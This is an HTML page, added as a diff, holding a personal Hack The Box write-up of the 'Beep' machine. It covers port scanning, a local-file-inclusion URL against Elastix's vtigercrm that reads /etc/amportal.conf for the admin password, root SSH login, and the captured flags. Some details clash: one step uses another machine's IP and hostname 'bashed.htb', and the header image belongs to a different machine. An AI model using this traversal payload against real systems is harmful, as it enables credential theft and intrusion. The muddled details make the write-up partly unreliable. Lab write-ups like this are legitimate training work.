@@ -1,0 +1,224 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Beep</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        img {
+            max-width: 100%;
+            height: auto;
+            display: block;
+            margin: 20px auto;
+            border: 1px solid #30363d;
+            border-radius: 4px;
+            }
+        
+        body {
+            background-color: #0d1117;
+            color: #79c0ff;
+            font-family: 'Courier New', monospace;
+            line-height: 1.6;
+            display: flex;
+            flex-direction: column;
+            align-items: center; /* Centers the header/title */
+            padding: 20px;
+        }
+
+        /* This is your main centered box */
+        .container {
+        display: flex; 
+            justify-content: center;
+            align-items: flex-start; 
+            gap: 30px; /* Increased gap between main box and sidebar */
+            margin: 0 auto; 
+            padding: 30px 30px; /* Adds 40px padding to left and right */
+            max-width: 1200px; /* Prevents the whole layout from becoming too wide */
+            width: 100%;
+        }
+
+        .main-content {
+        background-color: #0d1117;
+            border: 1px solid #30363d;
+            border-radius: 6px;
+            padding: 30px;
+            /* Removed flex-shrink: 0 to allow responsiveness */
+            max-width: 700px; /* Reduced from 800px as requested */
+            width: 100%;
+
+            
+        }
+
+        .terminal-box {
+            display: block; /* Changed from inline-block to block to prevent side-by-side issues */
+            background-color: #000000; 
+            color: #00FF00; 
+            padding: 15px; 
+            border-radius: 8px; 
+            font-family: 'Courier New', Courier, monospace;
+            border: 1px solid #333;
+            margin: 20px 0;
+            overflow-x: auto; /* Adds a scrollbar if the code line is too long */
+        }
+
+        h1, h2, h3 {
+            color: #79c0ff;
+            text-align: center; /* Centers your titles */
+            width: 100%;
+        }
+
+        p {
+            margin: 15px 0;
+            color: #8b949e;
+        }
+
+        a { color: #58a6ff; text-decoration: none; }
+        a:hover { text-decoration: underline; }
+
+        .sticky-element {
+            /* Keeps everything centered in the sticky note */
+            text-align: center;
+            position : sticky;
+            top: 20px;
+            padding: 15px;
+            }
+        
+        .sidebar {
+        flex: 0 1 250px; /* Grow: 0, Shrink: 1, Ideal width: 250px */
+            position: sticky;
+            top: 20px;
+        }       
+        
+    </style>
+</head>
+<body>
+<h1>Hack The Box</h1>
+<h2>Beep</h2>
+<img src="/pngs/HTB/Easy/Alert/Alert.png" alt="https://github.com/Hey0verhere/Hey0verhere.github.io/blob/main/pngs/HTB/Easy/Alert/Alert.png" style="border: none;">
+<h3>Easy</h3>
+
+<div class="container">
+    <div class="main-content">
+I started with port enumeration.
+
+<div class="terminal-box">
+    sudo nmap -p- --open -sS --min-rate 5000 -vvv -Pn -n  10.10.10.7
+  </div>
+
+<br>
+<ul>
+    <li>" -p- --open " : scans all ports and shows which ones are open</li>
+    <li>" -sS " : SYN scan.</li>
+    <li>" --min-rate 5000 " : specifies how many packets should be sent simultaneously.</li>
+    <li>" -vvv " : increases the verbosity of the scan , displays more detailed information.</li>
+    <br>
+    To have a clear view of the SYN scan we add : <br>
+    <li>" -Pn " : disables ICMP Echo request.</li>
+    <li>" -n " : disables DNS resolution</li>
+</ul>
+
+<br><br>
+
+I found ports 22,25,80,110,111,143,443,993,995,3306,4445,10000 open and enumerated them. <br><br>
+
+<ul>
+    <li>port 22/TCP - SSH</li>
+    <li>port 25/TCP - SMTP</li>
+    <li>port 80/TCP - HTTP</li>
+    <li>port 110/TCP - POP3</li>
+    <li>port 111/TCP - rpcbind</li>
+    <li>port 143/TCP - IMAP</li>
+    <li>port 443/TCP - HTTPS</li>
+    <li>port 993/TCP - sIMAP</li>
+    <li>port 995/TCP - pop3d</li>
+    <li>port 3306/TCP - MySQL</li>
+    <li>port 4445/TCP - upnotifyp?</li>
+    <li>port 10000/TCP - HTTP</li>
+</ul>
+
+<div class="terminal-box">
+nmap -sC -sV -p80 10.10.10.68
+</div> <br>
+<ul>
+    <li>" -sC " : executes default scripts</li>
+    <li>" -sV " : scans for service detection.</li>
+</ul><br>
+There I found that the domain name was "bashed.htb". Next I had to configure the "/etc/hosts" file.
+<br>
+<div class="terminal-box">
+<xmp>
+sudo tee -a /etc/hosts > /dev/null <<EOT
+
+## bashed host
+10.10.10.68 bashed.htb
+EOT
+</xmp>
+</div><br><br>
+
+I navigated to port 443, where I found Elastix application running.<br>
+I searched for vulnerabilies and found that there is a LFI for this version.
+<div class="terminal-box">
+https://10.10.10.7/vtigercrm/graph.php?current_language=../../../../../../../..//etc/amportal.conf%00&module=Accounts&action
+</div>
+<br>
+And I found this :
+<img src="![[Pasted image 20250505124352.png]]">
+<br>
+We get admin credentials `admin:jEhdIekWmdjE`.<br>
+I can connect now to Elastix as admin.<br>
+I didn't find something more there and there were a lot of things.<br>
+So I tried to to a password spray.<br>
+The ssh version is old so I had to do some configurations to the command and I connected as `root`.<br>
+
+<div class="terminal-box">
+    ssh -oHostKeyAlgorithms=+ssh-rsa -oKexAlgorithms=+diffie-hellman-group14-sha1 root@10.10.10.7
+</div>
+<br>
+---------------------------------------------------------------------<br>
+These were the errors that I got : 
+
+<div class="terminal-box">
+    $ ssh admin@10.10.10.7
+
+    Unable to negotiate with 10.10.10.7 port 22: no matching key exchange method found. Their offer: diffie-hellman-group-exchange-sha1,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1
+    
+    
+    $ ssh -oKexAlgorithms=+diffie-hellman-group1-sha1 admin@10.10.10.7 
+    
+    Unable to negotiate with 10.10.10.7 port 22: no matching host key type found. Their offer: ssh-rsa,ssh-dss
+    </div>
+    <br><br>
+    <img src="![[Pasted image 20250505134407.png]]">
+
+    Then after this I connected as root and could read root.txt and user.txt <br>
+
+<fieldset style="width: fit-content;">
+    <legend>User Flag</legend>
+    ba840a922b6df8c81ffe9d45db7cd5fb
+</fieldset>
+<br>
+<br>
+
+<fieldset style="width: fit-content;">
+    <legend>Root Flag</legend>
+    a7399de4bbbcd6982bad73ff86884952
+</fieldset>
+<br>
+</div>
+<aside class="sidebar">
+    <div class="sticky-element">
+        <a href="/index.html"><h3>Home</h3></a>
+        <a href="/machines.html"><h3>Machines</h3></a>
+    </div>
+</aside>
+</div>
+
+    
+</body>
+</html>
